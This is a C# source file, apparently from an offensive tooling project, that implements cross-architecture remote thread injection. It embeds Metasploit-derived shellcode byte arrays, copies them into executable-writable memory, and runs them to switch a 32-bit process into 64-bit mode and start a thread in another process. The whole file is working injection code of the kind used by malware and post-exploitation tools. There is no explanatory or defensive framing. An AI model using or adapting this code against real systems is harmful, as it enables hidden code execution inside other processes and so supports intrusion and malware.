using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Core.Injection
{
        public class Util
        {
            //nasm -f bin -O3 -o output.bin input.asm 

            [StructLayout(LayoutKind.Explicit)]
            private struct WOW64CONTEXT
            {
                [FieldOffset(0)] public UInt32 hProcess;
                [FieldOffset(0)] public UInt64 bPadding1;
                [FieldOffset(8)] public UInt32 lpStartAddress;
                [FieldOffset(8)] public UInt64 bPadding2;
                [FieldOffset(16)] public UInt32 lpParameter;
                [FieldOffset(16)] public UInt64 bPadding3;
                [FieldOffset(24)] public UInt32 hThread;
                [FieldOffset(24)] public UInt64 bPadding4;
            };

            [StructLayout(LayoutKind.Explicit)]
            private struct EXECUTE64CONTEXT
            {
                [FieldOffset(0)] public UInt32 lpStartAddress;
                [FieldOffset(0)] public UInt64 bPadding2;
                [FieldOffset(8)] public UInt32 lpParameter;
                [FieldOffset(8)] public UInt64 bPadding1;
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x1000,
                Reserve = 0x2000,
                Decommit = 0x4000,
                Release = 0x8000,
            }

            [Flags]
            public enum MemoryProtection
            {
                ExecuteReadWrite = 0x40,
            }

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress,
                                               IntPtr dwSize,
                                               AllocationType flAllocationType,
                                               MemoryProtection flProtect);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern bool VirtualFree(IntPtr lpAddress,
                                           IntPtr dwSize,
                                           AllocationType dwFreeType);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern UInt32 WaitForSingleObject(UInt32 hHandle, UInt32 dwMilliseconds);

            [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern UInt32 CreateThread(
                    IntPtr lpThreadAttributes,
                    UInt32 dwStackSize,
                    IntPtr lpStartAddress,
                    IntPtr lpParameter,
                    UInt32 dwCreationFlags,
                    out UInt32 lpThreadId);

            [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool IsWow64Process(
                [In] IntPtr hProcess,
                [Out] out bool wow64Process
            );

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern UInt32 ResumeThread(UInt32 hThread);

            public static bool IsWow64()
            {
                if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                    Environment.OSVersion.Version.Major >= 6)
                {
                    using (Process p = Process.GetCurrentProcess())
                    {
                        bool retVal;
                        if (!IsWow64Process(p.Handle, out retVal))
                        {
                            return false;
                        }
                        return retVal;
                    }
                }
                else
                {
                    return false;
                }
            }

            public static IntPtr CreateRemoteThread64(UInt32 hProcess, UInt32 lpStartAddress, UInt32 lpParameter)
            {
                IntPtr hResult = IntPtr.Zero;

                //Bail out on non-x86/wow process
                if (IntPtr.Size == 8)
                {
                    if (!IsWow64())
                    {
                        return hResult;
                    }
                }


                //TOMW modified version of: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
                byte[] migrate_executex64 = {      0x55, 0x89, 0xE5, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8B, 0x37, 0x8B, 0x4F, 0x08, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x83, 0xC0, 0x2A, 0x83, 0xEC, 0x08, 0x89, 0xE2, 0xC7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00, 0x89, 0x02, 0xE8, 0x0E, 0x00, 0x00, 0x00, 0x66, 0x8C, 0xD8, 0x8E, 0xD0, 0x83, 0xC4, 0x14, 0x5F, 0x5E, 0x5D, 0xC2, 0x08, 0x00, 0x8B, 0x3C, 0x24, 0xFF, 0x2A, 0x48, 0x31, 0xC0,
                                               0x57, 0xFF, 0xD6, 0x5F, 0x50, 0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, 0x89, 0x3C, 0x24, 0xFF, 0x2C, 0x24, };

                //TOMW modified version of: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
                byte[] migrate_wownativex = {    0xFC, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xE7, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1,
                                             0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x75, 0x72, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
                                             0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59,
                                             0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF, 0xFF, 0xFF, 0x5D, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x48, 0x8D, 0x46, 0x18, 0x50, 0xFF, 0x76, 0x10, 0xFF, 0x76, 0x08, 0x41, 0x51, 0x41, 0x51, 0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xD2, 0x48, 0x8B, 0x0E, 0x41, 0xBA, 0xC8,
                                             0x38, 0xA4, 0x40, 0xFF, 0xD5, 0x48, 0x85, 0xC0, 0x74, 0x07, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x05, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x48, 0x89, 0xFC, 0xC3,  };


                IntPtr pExec64Addr = VirtualAlloc(IntPtr.Zero, (IntPtr)(migrate_executex64.Length * 2), AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

                if (pExec64Addr != IntPtr.Zero)
                {
                    Marshal.Copy(migrate_executex64, 0, pExec64Addr, migrate_executex64.Length);

                    IntPtr pFunc = VirtualAlloc(IntPtr.Zero, (IntPtr)(migrate_wownativex.Length * 2), AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

                    if (pFunc != IntPtr.Zero)
                    {
                        Marshal.Copy(migrate_wownativex, 0, pFunc, migrate_wownativex.Length);

                        WOW64CONTEXT pCtx = new WOW64CONTEXT();

                        pCtx.hProcess = hProcess;
                        pCtx.lpParameter = lpParameter;
                        pCtx.lpStartAddress = lpStartAddress;
                        pCtx.hThread = (UInt32)0;

                        IntPtr pHGlobalCtx = Marshal.AllocHGlobal(Marshal.SizeOf(pCtx));

                        if (pHGlobalCtx != IntPtr.Zero)
                        {
                            Marshal.StructureToPtr(pCtx, pHGlobalCtx, false);

                            EXECUTE64CONTEXT pExecX64Ctx = new EXECUTE64CONTEXT();

                            pExecX64Ctx.lpParameter = (UInt32)pHGlobalCtx;
                            pExecX64Ctx.lpStartAddress = (UInt32)pFunc;

                            IntPtr pHGlobalExecX64Ctx = Marshal.AllocHGlobal(Marshal.SizeOf(pExecX64Ctx));

                            if (pHGlobalExecX64Ctx != IntPtr.Zero)
                            {
                                Marshal.StructureToPtr(pExecX64Ctx, pHGlobalExecX64Ctx, false);
                                UInt32 dwThreadId = 0;
                                UInt32 hThread = CreateThread(IntPtr.Zero, 0, pExec64Addr, pHGlobalExecX64Ctx, 0, out dwThreadId);

                                if (hThread != 0)
                                {
                                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                                }

                                Marshal.FreeHGlobal(pHGlobalExecX64Ctx);
                            }

                            Marshal.FreeHGlobal(pHGlobalCtx);
                        }

                        VirtualFree(pFunc, (IntPtr)migrate_wownativex.Length, AllocationType.Release);
                    }

                    VirtualFree(pExec64Addr, (IntPtr)migrate_executex64.Length, AllocationType.Release);
                }

                return hResult;
            }
        }
}


